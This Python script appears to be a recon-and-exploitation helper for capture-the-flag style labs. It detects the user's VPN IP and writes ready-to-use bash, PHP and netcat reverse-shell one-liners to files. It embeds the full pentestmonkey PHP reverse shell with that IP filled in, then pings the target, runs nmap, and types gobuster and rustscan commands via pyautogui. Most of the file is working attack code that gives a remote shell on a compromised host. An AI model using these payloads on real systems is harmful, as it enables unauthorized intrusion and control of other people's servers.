#!/usr/bin/env python3

import os
from time import sleep
import pyautogui
import subprocess
import re
import webbrowser
import argparse

""" Get target ip """
parser = argparse.ArgumentParser()
parser.add_argument("target_ip")
args = parser.parse_args()

MACHINE_IP = args.target_ip
MY_IP = ""
MY_PORT = "9000"
REVSHELL_DIR = "revshells"
SCAN_DIR = "scans"
WEB_DISCOVERY_WORDLIST = "/opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
WEB_FILE_EXTENSIONS = ".js,.json,.txt,.php"


""" Function for Showing in terminal """


def show(log_data):
    print(log_data)


""" Creating necessary folders for storing the reverse shells"""

# Checking for revshell dirs
if(os.path.isdir(REVSHELL_DIR)):
    show("[+] Revshell folder already created.")
else:
    show("[-] Revshell folder not found. Creating new folder for storing revshells")
    os.mkdir(REVSHELL_DIR)
    show(f"[+] Created {REVSHELL_DIR} folder")

# Checking for scan dirs
if(os.path.isdir(SCAN_DIR)):
    show("[+] Scan folder already created.")
else:
    show("[-] Scan folder not found. Creating new folder for storing scan results")
    os.mkdir(SCAN_DIR)
    show(f"[+] Created {SCAN_DIR} folder")

# Checking whether readme is already created
if(os.path.isfile("README.md")):
    show("[+] README.md file already exists")
else:
    show("[-] README.md file not found")
    readmefile = open("README.md", "w")
    readmefile.close()

""" Find The tun0 ip of the machine"""

tun0_output = ""
tun0_ip_regex = re.compile(r"\d+\.\d+\.\d+\.\d+")
# subprocess.communicate returns a byte object. So have to decode to utf 8
tun0_check_process = subprocess.Popen(
    ["ifconfig", "tun0"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
tun0_output = tun0_check_process.communicate()[0].decode("utf-8")
rc = tun0_check_process.returncode
if(rc):
    exit("[-] No openvpn connection detected")

MY_IP = tun0_ip_regex.findall(tun0_output)[0]
show(f"[+] Openvpn connection OK. IP: {MY_IP}")

""" Creating Reverse shell payloads"""

# BASH
bash_revshell = f"bash -i >& /dev/tcp/{MY_IP}/{MY_PORT} 0>&1\n"
bash_revshell_file = open(f"{REVSHELL_DIR}/bash_revshell", "w")
bash_revshell_file.write(bash_revshell)
bash_revshell_file.close()
# PHP
php_revshell = f"php -r '$sock=fsockopen(\"{MY_IP}\",{MY_PORT});exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n"
php_revshell_file = open(f"{REVSHELL_DIR}/php_revshell", "w")
php_revshell_file.write(php_revshell)
php_revshell_file.close()
# NETCAT
nc_revshell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {MY_IP} {MY_PORT} >/tmp/f\n"
nc_revshell_file = open(f"{REVSHELL_DIR}/nc_revshell", "w")
nc_revshell_file.write(nc_revshell)
nc_revshell_file.close()

show(
    f"[+] Created reverse shells for copying with IP {MY_IP} and PORT {MY_PORT}")


"""PHP Reverse Shell File Creation"""

php_revcode = """<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '""" + MY_IP + """';  // CHANGE THIS
$port = """ + MY_PORT + """;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>



"""

php_revfile = open(f"{REVSHELL_DIR}/revshell.php", "w")
php_revfile.write(php_revcode)
php_revfile.close()

show(
    f"[+] Created reverse shells for uploading with IP {MY_IP} and PORT {MY_PORT}")


"""Checking Whether the ip is up or not"""

show(f"[*] Checking whether the MACHINE_IP {MACHINE_IP} is live or not")
ping_process = subprocess.Popen(
    ["ping", "-w", "3", MACHINE_IP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
ping_machine = ping_process.communicate()[0].decode("utf-8")
rc = ping_process.returncode
if rc or ("100% packet loss" in ping_machine):
    show(f"[-] IP {MACHINE_IP} not reachable.")
    exit()
show(f"[+] MACHINE_IP {MACHINE_IP} is up.")


"""Initializing Scanning"""

# Check if port 80 is open. If open start web browser
# os.system(f"nmap {MACHINE_IP} -p 80")
show("[*] Checking whether port 80 is up")
webserver_up_check_process = subprocess.Popen(
    ["nmap", MACHINE_IP, "-p", "80"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
webserver_up_check = webserver_up_check_process.communicate()[
    0].decode("utf-8")
if "open" in webserver_up_check:
    show(f"[+] Webserver is up. Opening in browser")
    webbrowser.open_new_tab(f"http://{MACHINE_IP}")
    sleep(4)
    pyautogui.hotkey("alt", "tab")
    sleep(2)
    pyautogui.hotkey("ctrl", "alt", "h")
    show("[*] Starting content discovery operation")
    pyautogui.write(
        f"gobuster dir -u {MACHINE_IP} -w  {WEB_DISCOVERY_WORDLIST} -t 30")
    pyautogui.press("enter")
    sleep(4)
    pyautogui.hotkey("ctrl", "tab")
    sleep(1)
    pyautogui.hotkey("ctrl", "alt", "v")
show(f"[*] Performing further scanning")
pyautogui.write(
    f"rustscan -a {MACHINE_IP} -- -A -vv -sV -sC -oN {SCAN_DIR}/nmap.txt")
pyautogui.press("enter")


# python -m SimpleHTTPServer 1337
